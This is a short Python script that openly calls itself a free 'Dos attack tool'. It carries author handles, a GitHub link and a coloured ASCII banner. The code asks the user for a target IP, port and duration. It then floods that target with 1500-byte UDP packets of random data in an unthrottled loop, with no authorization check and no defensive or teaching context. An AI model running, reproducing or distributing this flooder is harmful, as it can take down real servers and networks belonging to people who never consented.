#Dos attack tool by @4pc_0 & @hussein.1994
#Do not sale it , for free only.
#github : https://github.com/4pc0

import os
import sys
import time
import random
import socket
import colorama
from colorama import Fore
colorama.init(autoreset=True)

logo = f"""   
{Fore.CYAN}           __  __            ____ 
{Fore.CYAN}           \ \/ /           | __ \ 
{Fore.CYAN}            \  /     ___    ||  \ \ 
{Fore.CYAN}            /  \    |   |   ||__/ / 
{Fore.CYAN}           /_/\_\   |___|   |____/ 
{Fore.CYAN}           ========================
{Fore.WHITE}          @4pc_0  +  @hussein.1994
{Fore.GREEN}          https://github.com/4pc0/ 

{Fore.RED}     This tool is for free use, do not sell it.                                               
"""
print(logo)

sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
bytes = random._urandom(1500)

print("")
ip = input(f"{Fore.CYAN}[+] Enter target ip : ")
port = int(input("[+] Enter target port (defult 80) : "))
dur = int(input("[+] Enter time duration (1~100000) : "))
timeout = time.time() + dur
sent = 0
while True :
    try:
        if time.time() > timeout :
            break
        else:
            pass
        sock.sendto(bytes, (ip, port))
        sent = sent + 1
        print("sent",sent,"packets to",ip,"through port",port,)
    except KeyboardInterrupt:
        sys.exit()
print(f"""{Fore.RED}
    Dos attack Done:)
""")